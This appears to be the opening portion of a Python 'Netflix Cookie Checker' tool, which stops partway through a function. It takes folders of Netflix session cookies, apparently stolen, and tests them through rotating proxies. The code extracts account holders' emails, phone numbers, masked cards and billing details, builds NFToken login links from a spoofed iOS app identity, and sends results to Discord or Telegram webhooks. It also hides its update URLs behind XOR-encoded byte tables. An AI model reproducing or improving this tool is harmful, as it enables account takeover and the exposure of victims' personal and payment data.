import copy
import html
import json
import os
import queue
import random
import re
import shutil
import string
import sys
import threading
import unicodedata
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import requests
from urllib3.exceptions import InsecureRequestWarning

try:
    import yaml
except ImportError:
    yaml = None

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False,
        "email": False,
        "max_streams": True,
        "plan_price": True,
        "plan": True,
        "country": True,
        "member_since": False,
        "next_billing": True,
        "extra_members": True,
        "payment_method": True,
        "card": False,
        "phone": False,
        "quality": True,
        "hold_status": False,
        "email_verified": False,
        "membership_status": False,
        "profiles": True,
        "user_guid": False,
    },
    "nftoken": False,
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "full",
            "plans": "all",
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "full",
            "plans": "all",
        },
    },
    "display": {
        "mode": "simple",
    },
    "retries": {
        "error_proxy_attempts": 3,
        "nftoken_attempts": 1,
    },
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Checker By: https://github.com/harshitkamboj
# Website: https://harshitkamboj.in
# Discord: illuminatis69

# Netflix Checker configuration
# true/false fields let users turn output lines ON/OFF in generated txt.
# Main fields stay ON by default. Advanced fields are listed too, but OFF by default.
txt_fields:
  name: false # account holder name
  email: false # account email
  plan: true # plan name
  country: true # country code
  member_since: false # account membership date
  quality: true # playback quality
  max_streams: true # max concurrent screens
  plan_price: true # plan price
  next_billing: true # next billing date
  payment_method: true # payment method type
  card: false # masked card / bank suffix
  phone: false # phone number
  hold_status: false # account hold status
  extra_members: true # whether extra members are enabled
  email_verified: false # email verification status
  membership_status: false # membership state
  profiles: true # profile names
  user_guid: false # user GUID extracted from account data

nftoken: false # allowed: "pc", "mobile", "both" or false (case-insensitive, true => "both")
add_emojis: "webhook" # allowed: false, "txt", "webhook", "both"; "webhook" = Discord/Telegram notification messages only (not TXT files); true => "both"

notifications:
  webhook:
    enabled: false # true to send output to Discord webhook
    url: "" # put full webhook URL here
    mode: "full" # allowed: "full", "cookie", "nftoken"
    plans: "all" # use "all" or multiple like ["premium", "standard_with_ads", "standard", "basic", "mobile", "free"]

  telegram:
    enabled: false # true to send output to Telegram
    bot_token: "" # token from @BotFather
    chat_id: "" # your chat/channel id (example: "-1001234567890")
    mode: "full" # allowed: "full", "cookie", "nftoken"
    plans: "all" # use "all" or multiple like ["premium", "standard_with_ads", "standard", "basic", "mobile", "free"]

display:
  mode: "simple" # allowed: "log" or "simple"

retries:
  error_proxy_attempts: 3 # retry attempts on network/proxy errors (rotates proxy each try)
  nftoken_attempts: 1 # retry attempts for NFToken creation

performance:
  request_timeout_seconds: 15 # lower timeout = faster failure on bad proxies
  fallback_account_page: false # true = fetch /YourAccount as secondary fallback (slower)
  retry_incomplete_info: false # true = retry on partial account pages (slower, may recover some data)
  nftoken_for_free: false # true = also generate NFToken for free accounts (slower)
"""

BANNER = r"""
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝

by https://github.com/harshitkamboj | website: harshitkamboj.in | discord: https://discord.gg/DYJFE9nu5X
                        (Star The Repo 🌟 and Share for more Checkers)
"""

APP_VERSION = "4.5.0"

cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"
DISCORD_WEBHOOK_USERNAME = "Netflix Checker github.com/harshitkamboj"
DISCORD_WEBHOOK_AVATAR_URL = "https://i.ibb.co/XZLnRkFs/netflix-logo-png-2616.png"

lock = threading.Lock()
guid_lock = threading.Lock()
processed_emails = set()

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def _decode_hidden_text(values):
    return "".join(chr(value ^ _pull_bias()) for value in values)


def _stitch_hidden(slot):
    merged = []
    for provider in (_noise_floor, _window_cache, _frame_index):
        for block in provider(slot):
            merged.extend(block)
    return _decode_hidden_text(merged)


def parse_version_parts(value):
    cleaned = str(value or "").strip().lower().lstrip("v")
    parts = []
    for part in cleaned.split("."):
        match = re.match(r"(\d+)", part)
        parts.append(int(match.group(1)) if match else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def is_newer_version(current_version, latest_version):
    current_parts = parse_version_parts(current_version)
    latest_parts = parse_version_parts(latest_version)
    max_len = max(len(current_parts), len(latest_parts))
    current_parts += (0,) * (max_len - len(current_parts))
    latest_parts += (0,) * (max_len - len(latest_parts))
    return latest_parts > current_parts


def _resolve_update_endpoints():
    # ref: gh[.]com/harshitkamboj
    repo_url = _stitch_hidden(29)
    repo_root = _stitch_hidden(53)
    api_prefix = _stitch_hidden(59)
    api_suffix = _stitch_hidden(61)
    accept_value = _stitch_hidden(67)
    agent_prefix = _stitch_hidden(71)
    repo_path = repo_url.replace(repo_root, "", 1).strip("/")
    return {
        "repo_url": repo_url,
        "api_url": f"{api_prefix}{repo_path}{api_suffix}",
        "discord_url": _stitch_hidden(47),
        "accept_value": accept_value,
        "agent_value": f"{agent_prefix}{APP_VERSION}",
    }


def _render_update_notice(latest_version, github_url, discord_url):
    divider = "=" * 98
    print("")
    print(divider)
    print(f"{_stitch_hidden(79)}{APP_VERSION}{_stitch_hidden(83)}{latest_version}")
    print(f"{_stitch_hidden(89)}{github_url}")
    print(f"{_stitch_hidden(97)}{discord_url}")
    print(divider)
    print("")


def check_for_updates():
    update_meta = _resolve_update_endpoints()

    try:
        response = requests.get(
            update_meta["api_url"],
            headers={
                "Accept": update_meta["accept_value"],
                "User-Agent": update_meta["agent_value"],
            },
            timeout=5,
        )
        if response.status_code != 200:
            return

        payload = response.json()
        if not isinstance(payload, dict):
            return

        latest_version = str(payload.get("tag_name") or payload.get("name") or "").strip()
        if not latest_version or not is_newer_version(APP_VERSION, latest_version):
            return

        github_url = payload.get(_stitch_hidden(73)) or update_meta["repo_url"]
        _render_update_notice(latest_version, github_url, update_meta["discord_url"])
    except Exception:
        return


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def set_console_title(title):
    if os.name == "nt":
        os.system(f"title NetflixChecker - {title}")
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def color_text(text, code, enabled=True):
    if not enabled:
        return text
    return f"{code}{text}\033[0m"


def create_base_folders():
    # note: site=harshitkamboj[.]in
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)

    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")
            f.write("# One proxy per line\n")
            f.write("# Supported examples:\n")
            f.write("# ip:port\n")
            f.write("# user:pass@ip:port\n")
            f.write("# ip:port@user:pass\n")
            f.write("# http://ip:port\n")
            f.write("# https://user:pass@ip:port\n")
            f.write("# socks4://user:pass@ip:port\n")
            f.write("# socks5://user:pass@ip:port\n")
            f.write("# ip:port:user:pass\n")
            f.write("# user:pass:ip:port\n")
            f.write("# ip:port user:pass\n")
            f.write("# ip:port|user:pass\n")


def get_run_folder():
    now = datetime.now()
    return f"run_{now.strftime('%Y-%m-%d_%H-%M-%S')}"


def cleanup_stale_temp_files():
    managed_roots = [output_folder, failed_folder, broken_folder]
    for root in managed_roots:
        if not os.path.exists(root):
            continue
        for current_root, _, files in os.walk(root):
            for filename in files:
                if filename.lower().endswith(".tmp"):
                    try:
                        os.remove(os.path.join(current_root, filename))
                    except Exception:
                        pass


def sanitize_reason_for_filename(reason):
    cleaned = decode_netflix_value(reason) or "unknown_reason"
    cleaned = cleaned.strip().lower()
    replacements = {
        "http 403 forbidden": "http_403_forbidden",
        "http 429 rate limited": "http_429_rate_limited",
        "http 500 server error": "http_500_server_error",
        "http 502 bad gateway": "http_502_bad_gateway",
        "http 503 service unavailable": "http_503_service_unavailable",
        "http 504 gateway timeout": "http_504_gateway_timeout",
        "request timeout": "timeout",
        "timeout": "timeout",
        "proxy error": "proxy_error",
        "missing required cookies": "missing_required_cookies",
        "incomplete account page": "incomplete_account_page",
        "nftoken api error": "nftoken_api_error",
    }
    for source, target in replacements.items():
        if cleaned == source:
            cleaned = target
            break
    cleaned = re.sub(r"[^a-z0-9]+", "_", cleaned).strip("_")
    return cleaned or "unknown_reason"


def build_reason_filename(original_name, reason):
    base_name, extension = os.path.splitext(original_name)
    safe_reason = sanitize_reason_for_filename(reason)
    trimmed_base = re.sub(r'[<>:"/\\|?*]+', "_", base_name).strip(" .") or "cookie"
    candidate = f"{safe_reason}_{trimmed_base}{extension or '.txt'}"
    return candidate


def build_bundle_filename(original_name, bundle_index=1, bundle_total=1):
    if bundle_total <= 1:
        return original_name
    base_name, extension = os.path.splitext(original_name)
    safe_base = re.sub(r'[<>:"/\\|?*]+', "_", base_name).strip(" .") or "cookie"
    return f"{safe_base}__part_{bundle_index}_of_{bundle_total}{extension or '.txt'}"


def build_bundle_display_name(original_name, bundle_index=1, bundle_total=1):
    if bundle_total <= 1:
        return original_name
    return f"{original_name} [{bundle_index}/{bundle_total}]"


def move_cookie_with_reason(cookie_path, target_folder, cookie_file, reason):
    if not os.path.exists(cookie_path):
        return
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base_name, extension = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base_name}_{suffix}{extension}")
    shutil.move(cookie_path, target_path)


def write_cookie_with_reason(target_folder, cookie_file, reason, content):
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base_name, extension = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base_name}_{suffix}{extension}")
    write_text_file_safely(target_path, content)


def is_plan_allowed_for_notifications(channel_cfg, plan_key):
    plans_value = (channel_cfg or {}).get("plans", "all")
    if plans_value is None:
        return True
    if isinstance(plans_value, str):
        normalized = plans_value.strip().lower()
        if normalized in {"", "all", "*"}:
            return True
        allowed = {item.strip().lower() for item in normalized.split(",") if item.strip()}
        return (plan_key or "").lower() in allowed
    if isinstance(plans_value, (list, tuple, set)):
        allowed = {str(item).strip().lower() for item in plans_value if str(item).strip()}
        if not allowed:
            return True
        return (plan_key or "").lower() in allowed
    return True


def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium",
        "standard_with_ads": "Standard With Ads",
        "standard": "Standard",
        "basic": "Basic",
        "mobile": "Mobile",
        "extra_member_premium": "Premium (Extra Member)",
        "free": "Free",
        "duplicate": "Duplicate",
        "unknown": "Unknown",
    }
    return canonical_labels.get(plan_key, "Unknown")


def create_output_folder_when_needed(base_folder, plan_label, run_folder, category=None):
    safe_plan = decode_netflix_value(plan_label) or "Unknown"
    safe_plan = re.sub(r'[<>:"/\\|?*]+', "_", safe_plan).strip(" .")
    safe_plan = safe_plan or "Unknown"
    if category:
        safe_category = decode_netflix_value(category) or "Other"
        safe_category = re.sub(r'[<>:"/\\|?*]+', "_", safe_category).strip(" .")
        safe_category = safe_category or "Other"
        output_path = os.path.join(base_folder, run_folder, safe_plan, safe_category)
    else:
        output_path = os.path.join(base_folder, run_folder, safe_plan)
    os.makedirs(output_path, exist_ok=True)
    return output_path


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")

    last_error = None
    for _ in range(2):
        try:
            with open(path, "wb") as out_f:
                out_f.write(data)
                out_f.flush()
                try:
                    os.fsync(out_f.fileno())
                except OSError:
                    pass
            if data and os.path.getsize(path) == 0:
                raise IOError("File write produced a zero-byte output")
            return
        except Exception as exc:
            last_error = exc
            try:
                if os.path.exists(path) and os.path.getsize(path) == 0:
                    os.remove(path)
            except Exception:
                pass
    if last_error is not None:
        raise last_error


def _pull_bias():
    anchor = (11, 7, 5)
    return sum(anchor)


_NOISE_FLOOR_MAP = {
    53: ((127, 99, 99, 103, 100, 45, 56, 56, 112, 126),),
    73: ((127, 99, 122),),
    29: (
        (127, 99, 99, 103, 100, 45, 56, 56, 112, 126, 99, 127, 98, 117, 57, 116, 120, 122),
        (56, 127, 118, 101, 100, 127, 126, 99, 124, 118, 122, 117, 120, 125),
    ),
    59: ((127, 99, 99, 103, 100, 45, 56, 56, 118, 103, 126, 57),),
    79: ((66, 103, 115, 118, 99, 114),),
    89: ((83, 120, 96, 121, 123, 120, 118, 115),),
    47: ((127, 99, 99, 103, 100, 45, 56, 56, 115, 126),),
    97: ((83, 120, 96, 121, 123, 120, 118, 115),),
}


def _noise_floor(slot):
    return _NOISE_FLOOR_MAP.get(slot, ())


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def load_config():
    # mirror ref -> github.com / harshitkamboj
    config_yaml_path = "config.yml"

    if os.path.exists(config_yaml_path):
        if yaml is None:
            print("Warning: PyYAML not installed. Run: pip install -r requirements.txt")
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            print("Warning: Invalid config.yml. Recreating config.yml with defaults.")
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path


def print_config_summary(config, config_source):
    # web tag: https[:]//harshitkamboj.in
    txt_fields = config.get("txt_fields", {})
    nftoken_mode = get_nftoken_mode(config)
    add_emojis_mode = get_add_emojis_mode(config)
    webhook_cfg = config.get("notifications", {}).get("webhook", {})
    telegram_cfg = config.get("notifications", {}).get("telegram", {})
    display_cfg = config.get("display", {})
    retries_cfg = config.get("retries", {})
    performance_cfg = config.get("performance", {})
    retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    request_timeout_seconds = performance_cfg.get("request_timeout_seconds", 15)
    fallback_account_page = bool(performance_cfg.get("fallback_account_page", False))
    retry_incomplete_info = bool(performance_cfg.get("retry_incomplete_info", False))
    nftoken_for_free = bool(performance_cfg.get("nftoken_for_free", False))
    enabled_txt = [k for k, v in txt_fields.items() if bool(v)]
    try:
        retry_attempts = max(1, int(retry_attempts))
    except Exception:
        retry_attempts = 3
    try:
        request_timeout_seconds = max(5, int(request_timeout_seconds))
    except Exception:
        request_timeout_seconds = 15

    print("Active Config")
    print(f"- Config file: {config_source}")
    print(f"- TXT fields enabled: {', '.join(enabled_txt) if enabled_txt else 'none'}")
    print(f"- NFToken links: {nftoken_mode}")
    print(f"- Emojis: {add_emojis_mode}")
    print(f"- Webhook: {'ON' if webhook_cfg.get('enabled') else 'OFF'} (mode: {webhook_cfg.get('mode', 'full')})")
    print(f"- Telegram: {'ON' if telegram_cfg.get('enabled') else 'OFF'} (mode: {telegram_cfg.get('mode', 'full')})")
    print(f"- Display: mode={display_cfg.get('mode', 'log')}")
    print(f"- Retry attempts on proxy/network error: {retry_attempts}")
    print(f"- Request timeout (sec): {request_timeout_seconds}")
    print(f"- Account fallback page (/YourAccount): {'ON' if fallback_account_page else 'OFF'}")
    print(f"- Retry incomplete account pages: {'ON' if retry_incomplete_info else 'OFF'}")
    print(f"- Generate NFToken for free accounts: {'ON' if nftoken_for_free else 'OFF'}")
    print("")


def describe_http_error(status_code):
    descriptions = {
        403: "HTTP 403 Forbidden",
        429: "HTTP 429 Rate Limited",
        500: "HTTP 500 Server Error",
        502: "HTTP 502 Bad Gateway",
        503: "HTTP 503 Service Unavailable",
        504: "HTTP 504 Gateway Timeout",
    }
    return descriptions.get(status_code, f"HTTP {status_code}")


def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cookies_total, colored=True):
    title_color = "\033[96m"
    section_color = "\033[95m"
    label_color = "\033[94m"
    value_color = "\033[93m"
    dim_color = "\033[90m"
    progress_color = "\033[92m"
    good_color = "\033[92m"
    free_color = "\033[95m"
    bad_color = "\033[91m"
    hold_color = "\033[96m"

    clear_screen()
    processed = cookies_total - cookies_left
    valid = counts["hits"] + counts["free"]

    print(BANNER)
    print(color_text("Netflix Checker - Simple Mode", title_color, colored))
    print(
        f"{color_text('Progress:', title_color, colored)} "
        f"{color_text(str(processed), progress_color, colored)}/{color_text(str(cookies_total), progress_color, colored)} "
        f"| {color_text('Left:', title_color, colored)} {color_text(str(cookies_left), value_color, colored)}"
    )
    print("")
    print(color_text("Plan Counts", section_color, colored))
    default_plan_order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free"]

    # Keep extra-member accounts in separate folders internally, but show them as
    # a greyed sub-line under the base plan (similar to owner display in Spotify checker).
    extra_member_counts_by_base = {}
    for plan_key, plan_value in plan_counts.items():
        if not str(plan_key).startswith("extra_member_"):
            continue
        if plan_value <= 0:
            continue
        base_plan_key = str(plan_key)[len("extra_member_"):] or "unknown"
        extra_member_counts_by_base[base_plan_key] = extra_member_counts_by_base.get(base_plan_key, 0) + plan_value

    dynamic_base_keys = sorted(
        key for key in plan_counts.keys()
        if key not in default_plan_order and not str(key).startswith("extra_member_")
    )
    extra_only_base_keys = sorted(
        key for key in extra_member_counts_by_base.keys()
        if key not in default_plan_order and key not in dynamic_base_keys
    )
    plan_keys = default_plan_order + dynamic_base_keys + extra_only_base_keys

    for plan_key in plan_keys:
        base_value = plan_counts.get(plan_key, 0)
        extra_value = extra_member_counts_by_base.get(plan_key, 0)
        total_value = base_value + extra_value
        if plan_key == "unknown" and total_value <= 0:
            continue
        plan_label = decode_netflix_value(plan_labels.get(plan_key)) or format_plan_label(plan_key)
        print(f"{color_text(plan_label + ':', label_color, colored)} {color_text(str(total_value), value_color, colored)}")
        if extra_value > 0:
            print(f"   {color_text('└─ Extra Member:', dim_color, colored)} {color_text(str(extra_value), value_color, colored)}")

    print("")
    print(color_text("Status", section_color, colored))
    print(f"{color_text('Valid:', label_color, colored)} {color_text(str(valid), good_color, colored)}")
    print(f"{color_text('Good :', label_color, colored)} {color_text(str(counts['hits']), good_color, colored)}")
    print(f"{color_text('Free :', label_color, colored)} {color_text(str(counts['free']), free_color, colored)}")
    print(f"{color_text('Bad  :', label_color, colored)} {color_text(str(counts['bad']), bad_color, colored)}")
    print(f"{color_text('Dup  :', label_color, colored)} {color_text(str(counts['duplicate']), value_color, colored)}")
    print(f"{color_text('OnHold:', label_color, colored)} {color_text(str(counts['on_hold']), hold_color, colored)}")
    print(f"{color_text('Err  :', label_color, colored)} {color_text(str(counts['errors']), bad_color, colored)}")


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()

    url_like = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
        flags=re.IGNORECASE,
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(
            data["scheme"].lower(),
            data["host"],
            data["port"],
            data.get("user"),
            data.get("password"),
        )

    userpass_hostport = re.match(
        r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
    )
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport_userpass = re.match(
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$",
        line,
    )
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])

    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c, d, a, b)

    split_patterns = [
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$",
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    return None


_WINDOW_CACHE_MAP = {
    53: ((99, 127, 98, 117, 57, 116, 120, 122, 56),),
    73: ((123, 72, 98),),
    29: ((56, 89, 114, 99, 113, 123, 126, 111, 58, 84, 120, 120, 124, 126, 114),),
    59: ((112, 126, 99, 127, 98, 117, 57, 116, 120, 122, 56, 101, 114, 103),),
    79: ((55, 118, 97, 118, 126, 123, 118, 117),),
    83: ((55, 58),),
    89: ((55, 113, 101, 120, 122, 55, 80, 126),),
    47: ((100, 116, 120, 101, 115, 57, 112, 112, 56, 83),),
    97: ((55, 113, 101, 120, 122, 55, 83, 126),),
}


def _window_cache(slot):
    return _WINDOW_CACHE_MAP.get(slot, ())


def load_proxies():
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}


def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    normalized = normalized.lower()
    return "netflix." in normalized


def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)


def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True


def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""

    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue # https[:]//harshit kamboj.in
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
            netscape_lines.append(line)
    return "\n".join(netscape_lines)


def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []

    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]

    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []


def is_netscape_cookie_line(line):
